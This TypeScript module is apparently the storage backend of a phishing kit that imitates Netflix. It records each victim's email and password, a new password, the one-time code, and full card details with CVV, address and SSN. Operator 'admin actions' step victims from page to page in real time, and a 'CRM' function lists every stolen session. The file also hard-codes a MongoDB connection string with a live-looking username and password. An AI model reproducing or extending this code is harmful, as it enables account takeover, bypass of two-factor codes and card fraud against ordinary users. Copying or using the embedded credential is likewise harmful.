import { MongoClient, Db } from "mongodb";

const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://najarkamran555_db_user:XfpVllAyrurYO31I@cluster0.mjtrx2i.mongodb.net/";

if (!MONGODB_URI) {
  throw new Error("Please define the MONGODB_URI environment variable");
}

let client: MongoClient;
let clientPromise: Promise<MongoClient>;

// In-memory fallback storage
let inMemoryStorage: Map<string, UserSession> = new Map();
let useInMemory = false;

declare global {
  var _mongoClientPromise: Promise<MongoClient> | undefined;
  var _inMemoryStorage: Map<string, UserSession> | undefined;
}

// Initialize in-memory storage in development
if (process.env.NODE_ENV === "development") {
  if (!global._inMemoryStorage) {
    global._inMemoryStorage = new Map();
  }
  inMemoryStorage = global._inMemoryStorage;
}

if (process.env.NODE_ENV === "development") {
  if (!global._mongoClientPromise) {
    client = new MongoClient(MONGODB_URI);
    global._mongoClientPromise = client.connect().catch((error) => {
      console.warn(
        "MongoDB connection failed, falling back to in-memory storage:",
        error.message
      );
      useInMemory = true;
      throw error;
    });
  }
  clientPromise = global._mongoClientPromise;
} else {
  client = new MongoClient(MONGODB_URI);
  clientPromise = client.connect().catch((error) => {
    console.warn(
      "MongoDB connection failed, falling back to in-memory storage:",
      error.message
    );
    useInMemory = true;
    throw error;
  });
}

export async function getDatabase(): Promise<Db | null> {
  try {
    const client = await clientPromise;
    return client.db("netflix_crm");
  } catch (error) {
    console.warn("Using in-memory storage due to MongoDB connection failure");
    useInMemory = true;
    return null;
  }
}

// ONE USER SESSION MODEL - gets updated as user progresses
export interface UserSession {
  _id?: string;
  sessionId: string;

  // Email step data
  email: string;
  password: string;

  // Password step data (gets filled when user reaches password page)
  newPassword?: string;

  // OTP step data (gets filled when user reaches OTP page)
  otpCode?: string;

  // Payment step data (gets filled when user reaches payment page)
  cardInfo?: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    fullName: string;
    address: string;
    city: string;
    state: string;
    zipCode: string;
    ssn: string;
  };

  // Current step and status
  currentStep: "email" | "password" | "otp" | "payment" | "completed";
  status: "pending" | "approved" | "rejected";
  adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
  rejectionReason?: string;

  createdAt: Date;
  updatedAt: Date;
}

// CREATE INITIAL USER SESSION (Email step)
export async function createUserSession(
  email: string,
  password: string
): Promise<string> {
  const sessionId = Math.random().toString(36).substring(2, 15);
  const session: UserSession = {
    sessionId,
    email,
    password,
    currentStep: "email",
    status: "pending",
    createdAt: new Date(),
    updatedAt: new Date(),
  };

  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      await sessions.insertOne(session);
      console.log("✅ Session created in MongoDB:", sessionId);
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    console.log("📝 Using in-memory storage for session:", sessionId);
    inMemoryStorage.set(sessionId, session);
    useInMemory = true;
  }

  return sessionId;
}

// UPDATE USER SESSION (Add password step data)
export async function updateUserSessionPassword(
  sessionId: string,
  newPassword: string
): Promise<UserSession | null> {
  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      const result = await sessions.findOneAndUpdate(
        { sessionId },
        {
          $set: {
            newPassword,
            currentStep: "password",
            status: "pending",
            adminAction: undefined,
            rejectionReason: undefined,
            updatedAt: new Date(),
          },
        },
        { returnDocument: "after" }
      );
      return result || null;
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    // Use in-memory storage
    const session = inMemoryStorage.get(sessionId);
    if (session) {
      const updatedSession = {
        ...session,
        newPassword,
        currentStep: "password" as const,
        status: "pending" as const,
        adminAction: undefined,
        rejectionReason: undefined,
        updatedAt: new Date(),
      };
      inMemoryStorage.set(sessionId, updatedSession);
      return updatedSession;
    }
    return null;
  }
}

// UPDATE USER SESSION (Add OTP step data)
export async function updateUserSessionOtp(
  sessionId: string,
  otpCode: string
): Promise<UserSession | null> {
  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      const result = await sessions.findOneAndUpdate(
        { sessionId },
        {
          $set: {
            otpCode,
            currentStep: "otp",
            status: "pending",
            adminAction: undefined,
            rejectionReason: undefined,
            updatedAt: new Date(),
          },
        },
        { returnDocument: "after" }
      );
      return result || null;
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    // Use in-memory storage
    const session = inMemoryStorage.get(sessionId);
    if (session) {
      const updatedSession = {
        ...session,
        otpCode,
        currentStep: "otp" as const,
        status: "pending" as const,
        adminAction: undefined,
        rejectionReason: undefined,
        updatedAt: new Date(),
      };
      inMemoryStorage.set(sessionId, updatedSession);
      return updatedSession;
    }
    return null;
  }
}

// UPDATE USER SESSION (Add payment step data)
export async function updateUserSessionPayment(
  sessionId: string,
  cardInfo: UserSession["cardInfo"]
): Promise<UserSession | null> {
  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      const result = await sessions.findOneAndUpdate(
        { sessionId },
        {
          $set: {
            cardInfo,
            currentStep: "payment",
            status: "pending",
            adminAction: undefined,
            rejectionReason: undefined,
            updatedAt: new Date(),
          },
        },
        { returnDocument: "after" }
      );
      return result || null;
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    // Use in-memory storage
    const session = inMemoryStorage.get(sessionId);
    if (session) {
      const updatedSession = {
        ...session,
        cardInfo,
        currentStep: "payment" as const,
        status: "pending" as const,
        adminAction: undefined,
        rejectionReason: undefined,
        updatedAt: new Date(),
      };
      inMemoryStorage.set(sessionId, updatedSession);
      return updatedSession;
    }
    return null;
  }
}

// UPDATE SESSION STATUS (Admin actions)
export async function updateUserSessionStatus(
  sessionId: string,
  updates: {
    status?: "pending" | "approved" | "rejected";
    adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
    rejectionReason?: string;
  }
): Promise<UserSession | null> {
  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      const result = await sessions.findOneAndUpdate(
        { sessionId },
        { $set: { ...updates, updatedAt: new Date() } },
        { returnDocument: "after" }
      );
      return result || null;
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    // Use in-memory storage
    const session = inMemoryStorage.get(sessionId);
    if (session) {
      const updatedSession = {
        ...session,
        ...updates,
        updatedAt: new Date(),
      };
      inMemoryStorage.set(sessionId, updatedSession);
      return updatedSession;
    }
    return null;
  }
}

// GET USER SESSION
export async function getUserSession(
  sessionId: string
): Promise<UserSession | null> {
  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      return await sessions.findOne({ sessionId });
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    // Use in-memory storage
    return inMemoryStorage.get(sessionId) || null;
  }
}

// GET ALL USER SESSIONS (FOR CRM)
export async function getAllUserSessions(): Promise<UserSession[]> {
  try {
    const db = await getDatabase();
    if (db) {
      const sessions = db.collection<UserSession>("user_sessions");
      return await sessions.find({}).sort({ updatedAt: -1 }).toArray();
    } else {
      throw new Error("MongoDB not available");
    }
  } catch (error) {
    // Use in-memory storage
    return Array.from(inMemoryStorage.values()).sort(
      (a, b) => b.updatedAt.getTime() - a.updatedAt.getTime()
    );
  }
}
